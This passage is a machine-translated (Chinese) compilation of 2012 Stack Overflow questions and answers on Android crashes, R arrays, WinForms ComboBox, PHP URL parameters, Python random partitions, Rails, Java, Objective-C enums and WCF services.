        android:layout_height="wrap_content"
        android:gravity="center"
        android:text="5"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <Button
        android:id="@+id/button1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Back" />

</LinearLayout> 
```

然后我得到这个异常：

```
04-24 22:02:43.101: E/AndroidRuntime(10956): FATAL EXCEPTION: main
04-24 22:02:43.101: E/AndroidRuntime(10956): java.lang.RuntimeException: Unable to start activity ComponentInfo{run.alexander.fuchs/run.alexander.fuchs.display_score}: java.lang.NullPointerException
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread.access$600(ActivityThread.java:123)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.os.Looper.loop(Looper.java:137)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread.main(ActivityThread.java:4424)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at java.lang.reflect.Method.invokeNative(Native Method)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at java.lang.reflect.Method.invoke(Method.java:511)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:787)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:554)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at dalvik.system.NativeStart.main(Native Method)
04-24 22:02:43.101: E/AndroidRuntime(10956): Caused by: java.lang.NullPointerException
04-24 22:02:43.101: E/AndroidRuntime(10956):    at run.alexander.fuchs.display_score.onCreate(display_score.java:48)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.Activity.performCreate(Activity.java:4465)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-24 22:02:43.101: E/AndroidRuntime(10956):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-24 22:02:43.101: E/AndroidRuntime(10956):    ... 11 more 
```

这很奇怪，因为每个 laout 都在那里，字体在那里等等 :(

即使是共同的偏好也应该起作用！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T14:42:40.157

我发现了问题所在

SharedPreferences 未正确加载，因此加载失败

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:40:01.097

您的异常堆栈跟踪指向 display_score.java:48，但如果没有包含在您的代码中的包和导入语句，我无法分辨那是哪一行。如果是这条线

```
txt1.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf")); 
```

那么也许这个 SO 问题可能有助于解决它： [在运行时设置字体 Textview](https://stackoverflow.com/questions/3483110/set-font-at-runtime-textview)。如果字体文件不存在，您可能需要将它们放入 assets/fonts 目录中。

# arrays - 如何根据条件从数组中删除一系列矩阵？

> ID：10305269
> 
> 赞同：1
> 
> 时间：2012-04-24T20:07:58.307
> 
> 标签：arrays, r, matrix

如果我有一个数组定义为：

```
Q <- array(runif(48), c(4,4,3), dimnames=list(
  c("P","PO","C","T"), c("LL","RR","R","Y"), c("Jerry1", "Jerry2", "Jerry3"))) 
```

我想做的是检查数组 Q 中地址 Q[1, 4,] 的每个“Jerry_n”矩阵，如果 Q[1, 4] 小于 Q[1, 1, ]，那么我会喜欢删除那个杰里矩阵。

非常感谢您提供的任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:19:39.290

我认为

```
dropmat <- Q[1,4,] < Q[1,1,]
Q <- Q[,,!dropmat] 
```

应该这样做...

**编辑**：将结果分配给原始。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:29:33.977

```
Q[,,Q[1,1,]<=Q[1,4,]] 
```

那是你要的吗？

**编辑：**更新了不等式。

# iphone - 从设置/辅助功能中获取“大文本”字体大小？

> ID：10305273
> 
> 赞同：2
> 
> 时间：2012-04-24T20:08:15.803
> 
> 标签：iphone, uifont

设置/辅助功能“大文本”设置设置某些内置应用程序中的文本大小。

如何获取此设置以在我自己的应用程序中使用？我当然可以在我的应用程序中创建一个私有设置，但我宁愿使用全局设置。

我期待`[UIFont systemFontSize]`调整大小，但无论辅助功能中的设置如何，它总是返回 14。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-14T20:14:38.917

据我所知，这是不可能的。我打开[rdar://10660048](http://openradar.appspot.com/radar?id=1764407)以防万一，希望在 iOS 6.x 中可以使用类似的东西。如果有人知道私有 API 来访问我不介意*知道*的值。

# winforms - 我应该使用 Winforms 组合框的 SelectedItem、SelectedText 还是 SelectedValue？

> ID：10305279
> 
> 赞同：10
> 
> 时间：2012-04-24T20:08:28.893
> 
> 标签：winforms, combobox, selecteditem, selectedvalue, selectedtext

我想将组合框中的值作为参数传递给 SQL 语句。Winforms 组合框为我提供了几个用于检索值的选项，即 SelectedItem、SelectedText 和 SelectedValue。在这种情况下使用哪个最好/最安全？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-24T20:12:04.667

```
if (comboBox1.DropDownStyle == DropDownStyle.DropDown || 
    comboBox1.DropDownStyle == DropDownStyle.Simple)
{
    return comboBox1.Text;
} 
```

`Text`可能是最好的使用。这将从 ComboBox 中获取当前选择的文本作为字符串。

```
if (comboBox1.DropDownStyle == DropDownStyle.DropDownList)
{
    return comboBox1.GetItemText(comboBox1.SelectedItem);
} 
```

对于这种样式，您无法从`ComboBox`. 这将返回当前项目中的字符串`SelectedIndex`。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-24T20:14:55.323

SelectedValue 可能是最好的使用
SelectedText 将为您提供可编辑部分的选定文本，Selected Item 将返回您的对象，并且 selected index 将返回您的索引。通常对于应用程序 SelectedValue 被提取和使用。从 MSDN查看[Combobox](http://msdn.microsoft.com/en-us/library/system.windows.forms.combobox.aspx)

```
SelectedIndex   Gets or sets the index specifying the currently selected item.                (Overrides ListControl.SelectedIndex.)
SelectedItem    Gets or sets currently selected item in the ComboBox.
SelectedText    Gets or sets the text that is selected in the editable portion of a ComboBox.
SelectedValue   Gets or sets the value of the member property specified by the ValueMember property. (Inherited from ListControl.) 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2017-08-09T08:49:29.037

这取决于 3 件事 1.**模式**2\. **DropDownStyle** 3.**必需值**

在 ComboBox.SelectedIndexChanged

*   非绑定**模式**

    一种。DropDownStyle = 下拉

    *   SelectedItem 将返回 = SelectedText
    *   SelectedValue 将返回 = ""
    *   SelectedText 将返回 = SelectedText

        湾。DropDownStyle = DropDownList

        *   SelectedItem 将返回 = SelectedText
        *   SelectedValue 将返回 = ""
        *   SelectedText 将返回 = ""
*   使用数据绑定**模式**（意味着您正在从某个数据源（即 SQL Server 表）填充您的组合框）您将选择表的一列作为 DisplayMember，并选择与 ValueMember 相同或另一列。

    一种。DropDownStyle = 下拉

    *   SelectedItem 将返回 = System.Data.DataRowView（提示）
    *   SelectedValue 将返回 = ValueMemeber 的值
    *   SelectedText 将返回 = SelectedText（DisplayMember 的值）

        湾。DropDownStyle = DropDownList

        *   .SelectedItem 将返回 = System.Data.DataRowView（提示）
        *   .SelectedValue 将返回 = ValueMember 的值
        *   .SelectedText 将返回 = ""

注意：您也可以使用 .Text 将返回 = Text of ComboBox

结论：

1.  未绑定模式

    *   .SelectedItem 是最好的选择
2.  数据绑定模式

    一种。ValueMember 是必需的

    *   .SelectedValue 是最好的选择

        湾。DisplayMember 是必需的

        *   .Text 是最好的选择

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-01-30T18:12:30.587

*SelectedItem*似乎是一个安全的选择。

我有这个代码：

```
NRBQConsts.currentSiteNum = listBoxSitesWithFetchedData.SelectedValue.ToString(); 
```

...与 NRE 一起崩溃。

改成这样后：

```
NRBQConsts.currentSiteNum = listBoxSitesWithFetchedData.SelectedItem.ToString(); 
```

...它工作正常。

# android - 清除字段后

> ID：10305282
> 
> 赞同：0
> 
> 时间：2012-04-24T20:08:54.607
> 
> 标签：android, sharedpreferences

我正在为不同的 tetfields 和单选按钮设置共享首选项。我想在应用程序关闭并再次打开时清除这些字段，但要将这些首选项保留在磁盘上。在下面的代码中，当我取消此行时，名称被清除，但如果我对其他字段执行此操作，它会崩溃。如何清除预存储的 sharedpreference 的所有内容（**不是存储的值）？**

```
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.createprofile);
    SharedPreferences customSharedPreference = getSharedPreferences(
            "myCustomSharedPrefs", Activity.MODE_PRIVATE);

    name = (EditText) findViewById(R.id.namefield);
    // When i take off this line the name is cleared but if i do it to other fields it crashes.
    name.setText(customSharedPreference.getString("namepref", ""));

    age = (EditText) findViewById(R.id.agefield);

    age.setText(customSharedPreference.getString("agepref", ""));

    genderradiogroup = (RadioGroup) findViewById(R.id.radioGroup2);
    rb_male = (RadioButton) findViewById(R.id.maleradiobutton);
    rb_female = (RadioButton) findViewById(R.id.femaleradiobutton);
    genderradiogroup.check(customSharedPreference.getInt("genderprefs",
            rb_male.getId()));
   genderradiogroup.check(customSharedPreference.getInt("genderprefs",
          rb_male.getId()));

    weight = (EditText) findViewById(R.id.weightfield);
    weight.setText(customSharedPreference.getString("weightpref", ""));

    height = (EditText) findViewById(R.id.heightfield);
    height.setText(customSharedPreference.getString("heightpref", ""));

    levelofactivity = (RadioGroup) findViewById(R.id.radioGroup3);
    rb_light = (RadioButton) findViewById(R.id.lightradiobutton);
    rb_moderate = (RadioButton) findViewById(R.id.moderateradiobutton);
    rb_heavy = (RadioButton) findViewById(R.id.heavyradiobutton);
   levelofactivity.check(customSharedPreference.getInt("levelpref",
           rb_light.getId()));

    Age = Integer.parseInt(age.getText().toString());
    Weight = Integer.parseInt(weight.getText().toString());
    Height = Integer.parseInt(height.getText().toString());

    Button addUser = (Button) findViewById(R.id.checkcreateprofilebutton);

    addUser.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {

            savePreferences();

            float calnumber = calculateCalories(Age, Weight, Height);
            String lala = String.valueOf(calnumber);
            Toast.makeText(ProfilePreferenceActivity.this, lala,
                    Toast.LENGTH_LONG).show();

            usertable.open();
            long id = usertable.createUser(name.getText().toString(), age
                    .getText().toString(), gender, weight.getText()
                    .toString(), height.getText().toString(), level,
                    calnumber);

            Toast.makeText(ProfilePreferenceActivity.this,
                    "user added with" + level + gender, Toast.LENGTH_LONG)
                    .show();

            usertable.close();

            Intent Filling = new Intent();
            Filling.setClass(ProfilePreferenceActivity.this,
                    FillingActivity.class);
            startActivity(Filling);

        }
    });

}

private void savePreferences() {

    SharedPreferences customSharedPreference = getSharedPreferences(
            "myCustomSharedPrefs", Activity.MODE_PRIVATE);
    SharedPreferences.Editor editor = customSharedPreference.edit();
    editor.putString("namepref", name.getText().toString());
    editor.putString("agepref", age.getText().toString());
    editor.putInt("genderprefs", genderradiogroup.getCheckedRadioButtonId());
    editor.putString("heightpref", height.getText().toString());
    editor.putString("weightpref", weight.getText().toString());
    editor.putInt("levelpref", levelofactivity.getCheckedRadioButtonId());
    editor.putFloat("calpref", calnum);
    editor.commit();
    finish();

}

public float calculateCalories(int age, int weight, int height) {

    if (rb_male.isChecked()) {

        gender = "male";

        bmr = 66.5f + (13.75f * weight) + (5.003f * height)
                - (6.755f * age);

        if (rb_light.isChecked()) {
            level = "light";
            calnum = bmr * 1.375f;
        }
        if (rb_moderate.isChecked()) {
            level = "moderate";
            calnum = bmr * 1.55f;
        }
        if (rb_heavy.isChecked()) {
            level = "heavy";
            calnum = bmr * 1.725f;
        }

    } else if (rb_female.isChecked()) {

        gender = "female";

        bmr = 665 + (9.563f * weight) + (1.850f * height) - (4.676f * age);

        if (rb_light.isChecked()) {
            level = "light";
            calnum = bmr * 1.375f;
        }
        if (rb_moderate.isChecked()) {
            level = "moderate";
            calnum = bmr * 1.55f;
        }
        if (rb_heavy.isChecked()) {
            level = "heavy";
            calnum = bmr * 1.725f;
        }

    }
    return calnum;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:14:09.537

在 oncreate 方法中将共享首选项编辑为 NULL 值

# php - 使用 PHP 从 URL 中删除特定参数

> ID：10305291
> 
> 赞同：0
> 
> 时间：2012-04-24T20:09:44.477
> 
> 标签：php, arrays, url

所以我试图从数组中预定义的 URL 查询字符串中删除特定参数。这是我到目前为止所拥有的：

```
<?php
// Construct the current page URL
$host     = $_SERVER['HTTP_HOST'];
$script   = $_SERVER['SCRIPT_NAME'];
$params   = $_SERVER['QUERY_STRING'];
$currentUrl = 'http://' . $host . $script . '?' . $params;

// Store all URL parameters into an array (HOST, PATH, QUERY, etc)
$url_params = array();
$url_params = parse_url($currentUrl);

// Create an array to store just the query string, breaking them apart
$params_array = explode('&', $url_params['query']);

// Array holding URL parameters that we want to remove
$params_to_remove = array("param1", "param2", "param3", "param4", "param5");

$location = 0;
// Loop through and remove parameters found in PARAMS_TO_REMOVE array
for($x = 0; $x < count($params_to_remove); $x++) {
    if(in_array($params_to_remove[$x], $params_array)) {
        $location = array_search($params_to_remove[$x], $params_array);
        unset($params_array[$location]);
    }
}

// Print array after unwanted parameters were removed
print_r($params_array);
echo '<br /><br />';

// Construct a new array holding only the parameters that we want
$clean_params_array = array();
for($z = 0; $z < count($params_array); $z++) {
    if($params_array[$z] != '') array_push($clean_params_array, $params_array[$z]);
}

// Print clean array
print_r($clean_params_array);
echo '<br />';

// Construct the new URL
// If there are paramters remaining in URL reconstruct them
if(count($clean_params_array) > 0) {
    $final_url = 'http://www.example.com' . $url_params['path'] . '?';
    for($y = 0; $y < count($clean_params_array); $y++) {
        $final_url .= $clean_params_array[$y] . '&';
    }
    // Trim off the final ampersand
    $final_url = substr($final_url, 0, -1);
}
// No parameters in final URL
else $final_url = 'http://www.example.com' . $url_params['path'];

// Print final URL
echo '<br />' . $final_url;
?> 
```

这是输出：

使用[http://www.example.com/test.php?apple&banana&orange¶m1&strawberry¶m2&pineapple](http://www.example.com/test.php?apple&banana&orange&param1&strawberry&param2&pineapple)

```
Array ( [0] => apple [1] => banana [2] => orange [4] => strawberry [6] => pineapple ) 

Array ( [0] => apple [1] => banana [2] => orange [3] => strawberry ) 

http://www.example.com/test.php?apple&banana&orange&strawberry 
```

如您所见，我丢失了最后一个参数。我也觉得好像我太啰嗦了……我哪里错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:16:16.420

```
$new_url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."?".implode("&",array_diff(explode("&",$_SERVER['QUERY_STRING']),Array("param1","param2","param3","param4","param5"))); 
```

单线；）

尽管您最好将其`Array(...)`从那里取出并事先将其定义为变量，这样更容易阅读。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:21:47.323

```
<?php 
 /** 
  * generateURL() 
  * 
  * Sprava URL adresy 
  * 
  * @author   stenley <stenley@webdev.sk> 
  * @version   1.4 
  */ 

 function generateURL() { 
    $GET = $_GET; 
    $QUERY_STRING = ''; 
    $SCRIPT_NAME = substr(strrchr($_SERVER["SCRIPT_NAME"],"/"),1); 

    $num_args = func_num_args(); 
    if($num_args>0 && $num_args%2==0) { 
       $args = func_get_args(); 

       foreach($args as $index => $paramName) { 
          $paramName = trim($paramName); 

          if($index%2==0 && !empty($paramName)) { 
             $paramValue = trim($args[$index+1]); 

             if(array_key_exists($paramName, $GET) && empty($paramValue)) { 
                unset($GET[$paramName]);    
             } elseif(!empty($paramValue)) { 
                $GET[$paramName] = $paramValue; 
             } 
          } 
       } 
    } 

    foreach($GET as $param => $value) { 
       $QUERY_STRING .= $param."=".$value."&amp;"; 
    } 

    return $SCRIPT_NAME.((empty($QUERY_STRING)) ? '' : "?".substr($QUERY_STRING,0,-5)); 
 } 
 ?> 
```

这是管理 URL 地址的绝佳功能。使用很简单。[这里有一些](http://www.pcforum.sk/uzitocne-a-casto-pouzivane-skripty-vt45403.html#442821)斯洛伐克语的例子。但我想你会理解代码示例。或者我会为你翻译

> 对不起我的英语不好

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T20:24:13.950

部分答案在这一行： Array ( [0] => apple [1] =>banana [2] => orange [4] => strawberry [6] => pineapple )

请注意 $params_array[5] 不存在。但是，当 $z==5 时，您尝试读取 $params_array[5] （在您的 while 循环中，您会遍历值 $z = 0; => $z < 6; (count($params_array))

您可以使用 Kolink 的解决方案，或者使用`foreach`循环遍历所有值：

```
foreach($params_array as $param) {
    if($param != '') array_push($clean_params_array, $param); 
} 
```

# python - 将数字除以随机元素的随机数？

> ID：10305292
> 
> 赞同：5
> 
> 时间：2012-04-24T20:09:48.710
> 
> 标签：python, math, random, integer-division

如果我需要将例如 7 分成随机数量的随机大小的元素，我该怎么做？

所以有时我会得到 [3,4]，有时会得到 [2,3,1]，有时会得到 [2,2,1,1,0,1]？

我想这很简单，但我似乎无法得到结果。这是我试图在代码方面做的事情（不起作用）：

```
def split_big_num(num):
    partition = randint(1,int(4))
    piece = randint(1,int(num))
    result = []
    for i in range(partition):
        element = num-piece
        result.append(element)
        piece = randint(0,element)
#What's next?
        if num - piece == 0:
            return result
    return result 
```

编辑：每个结果数字都应该小于初始数字，并且零的数量应该不小于分区的数量。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-24T20:19:03.277

我会去下一个：

```
>>> def decomposition(i):
        while i > 0:
            n = random.randint(1, i)
            yield n
            i -= n

>>> list(decomposition(7))
[2, 4, 1]
>>> list(decomposition(7))
[2, 1, 3, 1]
>>> list(decomposition(7))
[3, 1, 3]
>>> list(decomposition(7))
[6, 1]
>>> list(decomposition(7))
[5, 1, 1] 
```

但是，我不确定这种随机分布是否完全均匀。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-24T20:15:09.130

您必须定义“随机”的含义。如果你想要一个任意整数分区，你可以生成所有整数分区，并使用`random.choice`. 请参阅[python：生成整数分区](https://stackoverflow.com/questions/10244180/python-generating-integer-compositions)这将不会给出 0 的结果。如果您允许 0，则您将不得不允许具有可能无限数量的 0 的结果。

或者，如果您只想删除随机块，请执行以下操作：

```
def arbitraryPartitionLessThan(n):
    """Returns an arbitrary non-random partition where no number is >=n"""
    while n>0:
        x = random.randrange(1,n) if n!=1 else 1
        yield x
        n -= x 
```

由于每个数字应该小于原始数字的问题约束，有点尴尬；如果您允许原始数字，它会更优雅。如果您想要 0，您可以执行 randrange(n) ，但除非有隐藏的原因您不共享，否则它没有意义。

*针对问题编辑*进行编辑：由于您希望“零的数量不应少于分区的数量”，因此您可以在末尾任意添加 0：

```
def potentiallyInfiniteCopies(x):
    while random.random()<0.5:
        yield x

x = list(arbitraryPartitionLessThan(n))
x += [0]*len(x) + list(potentiallyInfiniteCopies(0)) 
```

这个问题非常随意，我强烈建议您选择这个作为您的答案：

```
def arbitraryPartition(n):
    """Returns an arbitrary non-random partition"""
    while n>0:
        x = random.randrange(1,n+1)
        yield x
        n -= x 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T20:20:02.810

递归救援：

```
import random

def splitnum(num, lst=[]):
    if num == 0:
        return lst
    n = random.randint(0, num)
    return splitnum(num - n, lst + [n])

for i in range(10):
    print splitnum(7) 
```

**结果：**

```
[1, 6]
[6, 0, 0, 1]
[5, 1, 1]
[6, 0, 1]
[2, 0, 3, 1, 1]
[7]
[2, 1, 0, 4]
[7]
[3, 4]
[2, 0, 4, 1] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T22:02:23.397

此解决方案不插入 0（我不明白您对零规则的描述应该是什么），并且同样可能生成除原始数字之外的所有可能组合。

```
def split (n):
    answer = [1]
    for i in range(n - 1):
        if random.random() < 0.5:
            answer[-1] += 1
        else:
            answer.append(1)

    if answer == [n]:
        return split(n)
    else:
        return answer 
```

# ruby-on-rails - 在 Rails 中手动填充 select_tag

> ID：10305294
> 
> 赞同：0
> 
> 时间：2012-04-24T20:09:58.097
> 
> 标签：ruby-on-rails, ruby

我知道这看起来很疯狂，但我正在尝试做这样的事情：

```
def site_list
    @sites = []

    Dir.new(base_dir = "./app/sites/").each do |name, idx|
      path = "#{base_dir}#{name}"
      if FileTest.directory?(path) && !name.starts_with?('.')
        @sites << name
      end
    end

    return @sites
  end 
```

陪我度过我的疯狂。

有一个名为 的 URL 参数`:site`，如果存在，那么我想要一个手动创建的动态下拉列表来选择正确的元素。因此，为此，我需要创建一个关联数组/哈希，它执行 id > name。

一步步：

1.  列出所有关联 id > name 的目录（id 是编出来的，只是索引）
2.  根据 :site URL 参数，在选择列表中选择正确的元素
3.  没有第 3 步。

所以你有：`<%= select_tag :sites, options_for_select(site_list) %>`但第三个参数作为选择的选项。

希望这至少有一定的意义！

**英文说明**

1.  我正在根据文件系统中的文件夹填充一个数组
2.  该数组用于填充`select_tag`
3.  的`select_tag`当前选中项是根据当前路由确定的。( `:site`)
4.  如果路线不包含`:site`，则显示`select_tag`“请选择...”或类似的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:52:58.877

在选择表单助手中，您实际上可以传递一个哈希，键将显示在选择菜单中，值将是值。所以让@sites 成为一个哈希，就像这样：

```
class SitesController < ApplicationController
  ...
  @sites = { :site1 => 'stackoverflow', :site2 => 'someothersite' }
  ...
end 
```

**因此，要使用站点**获取参数过滤此哈希，让我们根据 Hash#keep_if 方法[http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-keep_if](http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-keep_if)创建一个助手：

```
module ApplicationHelper
  def site_list(sites, site)
    sites.keep_if { |name, value| value == site }
  end
end 
```

只需更改块中的条件即可为您工作。表单中的代码如下所示：<%

```
<% site = 'stackoverflow' %>
<%= site_list(@sites, site).inspect %>
<%= f.select :name, site_list(@sites, 'stackoverflow') %> 
```

没有助手的更好的方法是在控制器中使用 before_filter ：

```
class SitesController < ApplicationController
  before_filter :extract_select_option, :only => :your_action

  protected
  def extract_select_option
    # SITES - all sites readed from file
    @sites = SITES.keep_if { |key, value| value == params[:site] }
  end
end 
```

# java - 无法更新 arrayList 中的元素

> ID：10305301
> 
> 赞同：0
> 
> 时间：2012-04-24T20:10:24.337
> 
> 标签：java, arraylist, machine-learning

我有两个用于特征和权重元素的矩阵。我正在实现一个学习算法。我想更新 arraylist 的元素（表示一个特征样本的向量）。以下是代码。但是我的矩阵元素（向量元素没有）更新了。我也放了样品溶液。更新前后的值不会相同。你能告诉我代码的缺陷在哪里吗？

```
 for(int i =0 ; i< N ; i++){  //N is a large real number
    ArrayList<Double> featureVector = new ArrayList<Double>();
    featureVector = FeatureMatrix.get(i);
    System.out.println("Before::"+ featureVector);
    if(testList.contains(i)){
    for(int j=0 ; j< testList.size(); j++){
        if(i == testList.get(j)){       
        int indexInTestList= j;
        List<Double> subListNextCandidate ;
        subListNextCandidate =  weightVectorNextCandidate.subList((10*indexIntTestList),((10)*(indexInTestList+1))); //clips a portion of member from long list of members
        List<Double> approxWeight = new ArrayList<Double>();
        approxWeight = getApproxWeight(FeatureVector, indexInTestList, FeatureMatrix,WeightMatrix, bias); //approxWeight is a vector of same dimension as of featureVector

        for(int l=0 ; l< 10;l++){                 
            double Update = featureVector.get(l)+ Rate*((subListCandidate.get(l)-approxWeight.get(l))-(lambda*featureVector.get(l)*(1/M)));//M is large real number
            featureVector.set(l,Update);

        }                   
        }
    }
    }

    else{
    for(int l=0 ; l< 10;l++){
        double Update = featureVector.get(l)  -Rate*(lambda*featureVector.get(l)*(1/M));
        featureVector.set(l, Update);
    }                   
    }
    System.out.println("After:::"+ FeatureMatrix.get(i) );  
} 
```

示例输出是::

```
 Before::[0.04539928251182193, -0.16233604402485394, 0.905018369795912, -1.2817141994528614, 0.7065420460225843, -0.8946090188977665, -1.74892020689701, -2.1539901172158187, 1.8229765478806985, -1.8109945435256574]
 After:::[0.04539928251182193, -0.16233604402485394, 0.905018369795912, -1.2817141994528614, 0.7065420460225843, -0.8946090188977665, -1.74892020689701, -2.1539901172158187, 1.8229765478806985, -1.8109945435256574] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:25:10.357

我只能想到会发生这种情况的几个合理原因：

1.  率 == 0
2.  testList.contains(i) 总是假的

我强烈建议使用断点来调试它。至少，在调用 featureVector.set() 的地方放置一个 System.out.println 以确保它被调用过。我猜它从来没有被调用过，因为条件永远不会成为真的。

一定要使用断点，这将是一个救生员......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-06T13:16:48.233

的返回类型是`testList.get(j)`什么？您正在将整数与我怀疑的整数进行比较。这不太可能顺利...

# c# - 使用 System.Add 的 UserControl 插件

> ID：10305304
> 
> 赞同：0
> 
> 时间：2012-04-24T20:10:40.610
> 
> 标签：c#, .net, plugins, add-in, appdomain

我知道有很多关于在新应用程序域中加载插件的线程。我的错我以前没有读过它们。我有这个学校项目-基于插件的应用程序，几乎完成了。除了一个重要的点 - 插件必须加载到新域中。我使用这篇文章创建基于插件的应用程序[http://www.codeproject.com/Articles/6334/Plug-ins-in-C](http://www.codeproject.com/Articles/6334/Plug-ins-in-C)

我目前正赶上项目截止日期，并且我被同一应用程序域中的插件困住了。在以前的线程中已建议使用 System.AddIn （我预料到）但是，几乎没有想到 - 我找不到它是否可能使用包含使用 System.AddIn 的 UserControl 元素的插件

感谢您的所有建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T22:38:59.000

也许 System.AddIn 对于学校项目来说有点矫枉过正。它有一个相当高的学习曲线。我相信你在正确的轨道上。您需要了解如何：

*   创建一个新的应用程序域
*   使您的加载项类派生自 MarshalByRefObject
*   在新的 AppDomain 上创建加载项类的实例。

你的程序的其余部分将忘记这一切。这将是相同的，因为您将在主 AppDomain 上使用代理对象，而实际的加载项对象将在新的 AppDomain 上。所有基础设施都由 .Net Remoting 处理。

问候。

# java - 如何在我的应用程序上获得这种外观？

> ID：10305312
> 
> 赞同：-3
> 
> 时间：2012-04-24T20:11:19.507
> 
> 标签：java, android, user-interface, android-ui

[http://imgur.com/a/SzWKg](http://imgur.com/a/SzWKg)

我已经看到一些应用程序使用这种外观，我认为它看起来很棒，所以我希望我的应用程序也看起来像这样。

我试过制作一个 ListView 并使用“simple_list_item_1”，但这只是一个带有白色文本的纯黑色背景。

另外，我的应用程序可以看起来像那样并且仍然可用于 android 2.1 及更高版本吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:18:40.850

基本上就是 Holo.Light 主题，在 Android 4.0+ 中可用

有一个名为 HoloEverywhere 的项目： [https ://github.com/ChristopheVersieux/HoloEverywhere](https://github.com/ChristopheVersieux/HoloEverywhere)

那就是移植（显示黑暗主题的屏幕截图），Holo 主题看起来到 android 1.6+

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:14:36.233

他们可能使用了一些自定义颜色选项，尽管它本质上看起来像股票主题。

查看以下 Android 开发资源。

[http://developer.android.com/guide/topics/ui/themes.html](http://developer.android.com/guide/topics/ui/themes.html)

[http://developer.android.com/design/style/themes.html](http://developer.android.com/design/style/themes.html)

# objective-c - 在运行时更改枚举值？

> ID：10305315
> 
> 赞同：6
> 
> 时间：2012-04-24T20:11:32.560
> 
> 标签：objective-c, ios, enums, objective-c-runtime

有没有办法在目标 c 的运行时为枚举分配值？我有几个枚举，并希望每个枚举都有一定的价值。这些值可以从 xml 文件中读取。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-24T20:20:21.080

不幸的是，@Binyamin 是正确的，你不能用枚举来做到这一点。出于这个原因，我通常在我的项目中执行以下操作：

```
// in .h
typedef int MyEnum;

struct {
    MyEnum value1;
    MyEnum value2;
    MyEnum value3;
} MyEnumValues;

// in .m
__attribute__((constructor))
static void initMyEnum()
{
    MyEnumValues.value1 = 10;
    MyEnumValues.value2 = 75;
    MyEnumValues.value3 = 46;
} 
```

这还具有能够遍历值的优点，而这对于普通枚举是不可能的：

```
int count = sizeof(MyEnumValues) / sizeof(MyEnum);
MyEnum *values = (MyEnum *) &MyEnumValues;

for (int i = 0; i < count; i++)
{
    printf("Value %i is: %i\n", i, values[i]);
} 
```

总而言之，这是我在 C 中进行枚举的首选方式。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-24T20:12:53.063

不，枚举信息在编译时被删除。

# wcf - 两个 WCF 服务在同一台服务器上时无法交互

> ID：10305319
> 
> 赞同：0
> 
> 时间：2012-04-24T20:11:39.240
> 
> 标签：wcf, c#-4.0

我有两个由托管服务提供商托管的 WCF 服务。两种服务都可以正常工作。我可以从我自己的计算机甚至是由其他提供商托管的网站访问它们。奇怪的部分（至少，我不明白的部分）是；一个不能叫另一个。

这两个服务都位于 Web 根目录的子文件夹中，处于相同的层级。像 wwwroot\serviceone 和 wwwroot\servicetwo。两者都在 IIS 中标记为应用程序文件夹，它们都有一个几乎相似的 web.config，如下所示，只是名称不同：

```
<configuration>
     <system.web>
        <compilation targetFramework="4.0" />
      </system.web>
      <system.serviceModel>
    <behaviors>
      <serviceBehaviors>
        <behavior name="servone">
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="false"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
